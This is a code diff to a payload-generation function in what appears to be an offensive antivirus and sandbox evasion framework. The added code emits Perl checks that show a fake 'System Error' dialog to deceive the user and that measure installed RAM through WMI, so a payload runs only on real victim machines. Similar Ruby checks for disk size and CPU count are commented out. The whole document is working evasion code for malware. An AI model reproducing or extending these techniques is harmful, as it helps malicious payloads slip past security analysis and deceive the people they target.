@@ -312,6 +312,44 @@ def senecas_games(evasion_payload):
 
             # Add a tab for this check
             num_tabs_required += 1
+        
+        #if evasion_payload.required_options["DISKSIZE"][0].lower() != "x":
+
+        #    check_code += "require 'win32api'\n"
+        #    check_code += 'minDiskSizeGB = 50\n'
+        #    check_code += "GetDiskFreeSpaceEx = Win32API.new(\"kernel32\", \"GetDiskFreeSpaceEx\", ['P','P','P','P'], 'I')\n"
+        #    check_code += 'diskSizeBytes = [0].pack("Q"); freeBytesAvail = [0].pack("Q"); totalFreeBytes = [0].pack("Q")\n'
+        #    check_code += 'GetDiskFreeSpaceEx.call("C:", freeBytesAvail, diskSizeBytes, totalFreeBytes)\n'
+        #    check_code += 'diskSizeGB = diskSizeBytes.unpack("Q").first / 1073741824.0\n'
+        #    check_code += 'if diskSizeGB > minDiskSizeGB'
+
+            # Add a tab for this check
+        #    num_tabs_required += 1
+        
+        #if evasion_payload.required_options["NUMPROCS"][0].lower() != "x":
+        #    check_code += "require 'win32ole'\n"
+        #    check_code += 'if (WIN32OLE.connect("winmgmts://").ExecQuery("SELECT NumberOfCores FROM Win32_Processor").to_enum.first.NumberOfCores >= ' + evasion_payload.required_options["NUMPROCS"][0] + ')\n'
+
+            # Add a tab for this check
+        #    num_tabs_required += 1
+        
+        #if evasion_payload.required_options["MINRAM"][0].lower() != 'x':
+        
+        #if evasion_payload.required_options["USERPROMPT"][0].lower() != "x":
+
+        ##    title_bar = evasion_helpers.randomString()
+         #   body_text = evasion_helpers.randomString()
+         #   winapi_call = evasion_helpers.randomString()
+
+        #    check_code += 'require "Win32API"\n'
+        #    check_code += title_bar + ' = "System Error Encountered"\n'
+        #    check_code += body_text + ' = "Error encountered at address 0x41d3837f. Press OK to continue"\n'
+        #    check_code += winapi_call + " = Win32API.new('user32', 'MessageBox',['L', 'P', 'P', 'L'],'I')\n"
+        #    check_code += winapi_call + '.call(0,dialogBoxMessage,dialogBoxTitle,0)\n'
+        #    check_code += 'if true\n'
+
+            # Add a tab for this check
+        #    num_tabs_required += 1
 
         if evasion_payload.required_options["SLEEP"][0].lower() != "x":
 
@@ -336,6 +374,39 @@ def senecas_games(evasion_payload):
             check_code += '\t' * num_tabs_required + 'Use Sys::Hostname;\n'
             check_code += '\t' * num_tabs_required + 'my $' + rand_hostname + ' = hostname;\n'
             check_code += '\t' * num_tabs_required + 'if (index(lc($' + rand_hostname + '), lc(' + evasion_payload.required_options["HOSTNAME"][0] + ')) != -1){\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["USERPROMPT"][0].lower() != 'x':
+
+            flags = evasion_helpers.randomString()
+            title_bar_prompt = evasion_helpers.randomString()
+            message_prompt = evasion_helpers.randomString()
+            msg_box = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'use Win32;\n'
+            check_code += '\t' * num_tabs_required + '$' + flags + ' = 0x0;\n'
+            check_code += '\t' * num_tabs_required + '$' + msg_box + ' = new Win32::API ( "user32", "MessageBox", [N, P, P, I], N );\n'
+            check_code += '\t' * num_tabs_required + '$' + msg_box + '->Call ( 0, "System error at 0x48d72ac3. Press OK to continue.", "System Error Encountered", $' + flags + ');'
+            check_code += '\t' * num_tabs_required + 'if (1) {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["RAMSIZE"][0].lower() != 'x':
+
+            wmi_cim = evasion_helpers.randomString()
+            total_ram = evasion_helpers.randomString()
+            subMem = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'use Win32::OLE qw(EVENTS HRESULT in);\n'
+            check_code += '\t' * num_tabs_required + 'my $' + wmi_cim + ' = Win32::OLE->GetObject("WINMGMTS://./root/CIMv2");\n'
+            check_code += '\t' * num_tabs_required + 'my $' + total_ram + ' = 0;\n'
+            check_code += '\t' * num_tabs_required + 'foreach my $' + subMem + ' (in($' + wmi_cim + '->InstancesOf("Win32_PhysicalMemory"))) {\n'
+            check_code += '\t' * num_tabs_required + '\t$' + total_ram + ' += $' + subMem + '->{Capacity};\n'
+            check_code += '\t' * num_tabs_required + '}\n'
+            check_code += '\t' * num_tabs_required + 'if ($' + total_ram + '/1073741824 > ' + evasion_payload.required_options["RAMSIZE"][0] + ') {\n'
 
             # Add a tab for this check
             num_tabs_required += 1
